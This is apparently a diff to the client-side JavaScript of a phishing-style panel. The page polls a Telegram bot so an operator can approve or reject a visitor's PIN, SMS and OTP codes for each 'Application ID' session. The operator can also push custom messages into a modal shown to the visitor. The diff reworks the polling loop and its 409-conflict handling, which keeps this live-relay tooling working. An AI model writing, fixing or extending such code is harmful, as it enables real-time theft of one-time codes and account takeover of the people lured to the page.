@@ -149,130 +149,131 @@ document.getElementById('adminModalOverlay').addEventListener('click', function(
 });
 
 async function tgPoll() {
-    const offset = Math.max(lastOffset, Number(localStorage.getItem("tg_offset") || 0));
-    console.log("Polling Telegram, offset:", offset);
-    const r = await tgCall("getUpdates", { offset: offset, timeout: 30, allowed_updates: ["callback_query",
-            "message"] });
-    if (!r || !r.ok) {
-        console.log("Telegram poll failed or no result:", JSON.stringify(r));
-        // Handle 409 Conflict specifically
-        if (r && r.error_code === 409) {
-            console.error("409 Conflict! Full response:", JSON.stringify(r));
-            console.error("Likely causes: (1) page open in multiple tabs, (2) bot token also used by another bot instance/server, (3) another poller using same token");
-            // Attempt to delete the active webhook so polling can resume
-            tgCall("deleteWebhook", { force: true }).then((delResult) => {
-                console.log("deleteWebhook from 409 handler:", JSON.stringify(delResult));
-            }).catch((e) => {
-                console.warn("deleteWebhook from 409 handler failed:", e);
-            });
-            lastOffset = 0;
-            localStorage.removeItem("tg_offset");
-            // Wait a few seconds before retrying (avoid hammering the API)
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        }
-        return;
-    }
-    if (!r.result || !Array.isArray(r.result) || r.result.length === 0) {
-        console.log("No updates");
-        return;
-    }
-    console.log("Telegram updates:", r.result.length);
-    for (const u of r.result) {
-        lastOffset = u.update_id + 1;
-        localStorage.setItem("tg_offset", String(lastOffset));
-
-        if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message.text.includes("Application ID: ")) {
-            if (String(u.message.chat.id) !== TG_CHAT) continue;
-            const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
-            const customText = u.message.text;
-            if (currentSessionId && currentSessionId === targetSessionId) {
-                showAdminModal(customText);
-                tgCall("sendMessage", { chat_id: TG_CHAT, text: "✅ Message delivered to client." });
+    // Cooperative single-instance poll loop: only ONE getUpdates connection runs at a time.
+    while (true) {
+        const offset = Math.max(lastOffset, Number(localStorage.getItem("tg_offset") || 0));
+        console.log("Polling Telegram, offset:", offset);
+        const r = await tgCall("getUpdates", { offset: offset, timeout: 10, allowed_updates: ["callback_query",
+                "message"] });
+        if (!r || !r.ok) {
+            console.warn("Telegram poll failed:", JSON.stringify(r));
+            if (r && r.error_code === 409) {
+                // 409 means another instance is already polling (another tab of this app / other bot server).
+                // The other poller holds the connection; wait and retry so we resume as soon as it releases.
+                console.warn("409 Conflict: another bot instance is polling (another tab or server using this token). " +
+                    "Waiting 5s for it to finish before automatically retrying...");
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                continue;
             }
+            console.warn("Unexpected poll error; retrying in 10s...");
+            await new Promise(resolve => setTimeout(resolve, 10000));
             continue;
         }
-
-        const cq = u.callback_query;
-        if (!cq) continue;
-        console.log("Callback query received:", JSON.stringify({
-            callback_id: cq.id,
-            from: cq.from?.id,
-            chat_id: cq.message?.chat?.id,
-            message_id: cq.message?.message_id,
-            data: cq.data,
-            message_text: cq.message?.text?.substring(0, 60)
-        }));
-        if (String(cq.message?.chat?.id) !== TG_CHAT) {
-            tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: "Not authorized" });
+        if (!r.result || !Array.isArray(r.result) || r.result.length === 0) {
+            // No updates yet: poll again immediately (short 10s timeout keeps this lightweight).
+            console.log("No updates, polling again...");
             continue;
         }
-
-        const data = cq.data || "";
-        const colonIdx = data.indexOf(":");
-        const action = colonIdx >= 0 ? data.substring(0, colonIdx) : data;
-        const id = colonIdx >= 0 ? data.substring(colonIdx + 1) : "";
-
-        console.log("Action:", action, "ID:", id, "currentSession:", currentSessionId);
-
-        if (action === "ask_msg") {
-            tgCall("sendMessage", {
-                chat_id: cq.message.chat.id,
-                text: "Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: " + id,
-                reply_markup: { force_reply: true }
-            });
-            tgCall("answerCallbackQuery", { callback_query_id: cq.id });
-            continue;
-        }
-
-        let stage = null;
-        let label = "";
-        if (action === "approve_pin") { stage = "pin_approved"; label = "PIN approved"; }
-        else if (action === "reject_pin") { stage = "pin_rejected"; label = "PIN rejected"; }
-        else if (action === "approve_sms") { stage = "sms_approved"; label = "SMS approved"; }
-        else if (action === "reject_sms") { stage = "sms_rejected"; label = "SMS rejected"; }
-        else if (action === "approve_otp") { stage = "otp_approved"; label = "OTP approved"; }
-        else if (action === "reject_otp") { stage = "otp_rejected"; label = "OTP rejected"; }
-        else { console.log("Unknown action:", action); }
-
-        if (stage) {
-            console.log("Processing stage:", stage, "for id:", id);
-            const updated = updateSession(id, { stage });
-
-            // ─── Determine the final status text shown to the admin ───
-            const isApprove = stage.endsWith("_approved");
-            const statusEmoji = isApprove ? "✅" : "❌";
-            const actionName = stage.replace("_approved", "").replace("_rejected", "");
-            const finalButtonText = `${statusEmoji} ${actionName.toUpperCase()}`;
-
-            // Confirm the callback first (required by Telegram within time limit)
-            tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: label });
-
-            // Then lock the message so the admin sees final status and cannot click again
-            tgCall("editMessageReplyMarkup", {
-                chat_id: cq.message.chat.id,
-                message_id: cq.message.message_id,
-                reply_markup: { inline_keyboard: [[{ text: finalButtonText, callback_data: "noop" }]] }
-            }).then((markupResult) => {
-                console.log("editMessageReplyMarkup result:", markupResult ? "OK" : "FAILED");
-            }).catch((e) => {
-                console.warn("Failed to update bot button markup:", e);
-            });
-
-            console.log("currentSessionId:", currentSessionId, "| callback id:", id, "| updated:", updated ? 'YES' : 'NO');
-            if (currentSessionId === id && updated) {
-                console.log("Stage matched! Calling handleStageUpdate ->", stage);
-                handleStageUpdate(updated);
+        console.log("Telegram updates:", r.result.length);
+        for (const u of r.result) {
+            lastOffset = u.update_id + 1;
+            localStorage.setItem("tg_offset", String(lastOffset));
+    
+            if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message.text.includes("Application ID: ")) {
+                if (String(u.message.chat.id) !== TG_CHAT) continue;
+                const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
+                const customText = u.message.text;
+                if (currentSessionId && currentSessionId === targetSessionId) {
+                    showAdminModal(customText);
+                    tgCall("sendMessage", { chat_id: TG_CHAT, text: "✅ Message delivered to client." });
+                }
+                continue;
+            }
+    
+            const cq = u.callback_query;
+            if (!cq) continue;
+            console.log("Callback query received:", JSON.stringify({
+                callback_id: cq.id,
+                from: cq.from?.id,
+                chat_id: cq.message?.chat?.id,
+                message_id: cq.message?.message_id,
+                data: cq.data,
+                message_text: cq.message?.text?.substring(0, 60)
+            }));
+            if (String(cq.message?.chat?.id) !== TG_CHAT) {
+                tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: "Not authorized" });
+                continue;
+            }
+    
+            const data = cq.data || "";
+            const colonIdx = data.indexOf(":");
+            const action = colonIdx >= 0 ? data.substring(0, colonIdx) : data;
+            const id = colonIdx >= 0 ? data.substring(colonIdx + 1) : "";
+    
+            console.log("Action:", action, "ID:", id, "currentSession:", currentSessionId);
+    
+            if (action === "ask_msg") {
+                tgCall("sendMessage", {
+                    chat_id: cq.message.chat.id,
+                    text: "Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: " + id,
+                    reply_markup: { force_reply: true }
+                });
+                tgCall("answerCallbackQuery", { callback_query_id: cq.id });
+                continue;
+            }
+    
+            let stage = null;
+            let label = "";
+            if (action === "approve_pin") { stage = "pin_approved"; label = "PIN approved"; }
+            else if (action === "reject_pin") { stage = "pin_rejected"; label = "PIN rejected"; }
+            else if (action === "approve_sms") { stage = "sms_approved"; label = "SMS approved"; }
+            else if (action === "reject_sms") { stage = "sms_rejected"; label = "SMS rejected"; }
+            else if (action === "approve_otp") { stage = "otp_approved"; label = "OTP approved"; }
+            else if (action === "reject_otp") { stage = "otp_rejected"; label = "OTP rejected"; }
+            else { console.log("Unknown action:", action); }
+    
+            if (stage) {
+                console.log("Processing stage:", stage, "for id:", id);
+                const updated = updateSession(id, { stage });
+    
+                // ─── Determine the final status text shown to the admin ───
+                const isApprove = stage.endsWith("_approved");
+                const statusEmoji = isApprove ? "✅" : "❌";
+                const actionName = stage.replace("_approved", "").replace("_rejected", "");
+                const finalButtonText = `${statusEmoji} ${actionName.toUpperCase()}`;
+    
+                // Confirm the callback first (required by Telegram within time limit)
+                tgCall("answerCallbackQuery", { callback_query_id: cq.id, text: label });
+    
+                // Then lock the message so the admin sees final status and cannot click again
+                tgCall("editMessageReplyMarkup", {
+                    chat_id: cq.message.chat.id,
+                    message_id: cq.message.message_id,
+                    reply_markup: { inline_keyboard: [[{ text: finalButtonText, callback_data: "noop" }]] }
+                }).then((markupResult) => {
+                    console.log("editMessageReplyMarkup result:", markupResult ? "OK" : "FAILED");
+                }).catch((e) => {
+                    console.warn("Failed to update bot button markup:", e);
+                });
+    
+                console.log("currentSessionId:", currentSessionId, "| callback id:", id, "| updated:", updated ? 'YES' : 'NO');
+                if (currentSessionId === id && updated) {
+                    console.log("Stage matched! Calling handleStageUpdate ->", stage);
+                    handleStageUpdate(updated);
+                } else {
+                    console.log("Stage NOT triggered: session mismatch or update failed");
+                }
             } else {
-                console.log("Stage NOT triggered: session mismatch or update failed");
+                console.log("No stage for:", action, id);
+                tgCall("answerCallbackQuery", { callback_query_id: cq.id });
             }
-        } else {
-            console.log("No stage for:", action, id);
-            tgCall("answerCallbackQuery", { callback_query_id: cq.id });
         }
     }
 }
 
-setInterval(() => { tgPoll().catch(() => {}); }, 3000);
+// Start the single cooperative poller when the page loads.
+tgPoll().catch(() => {});
+
 
 function handleStageUpdate(session) {
     const stage = session.stage;
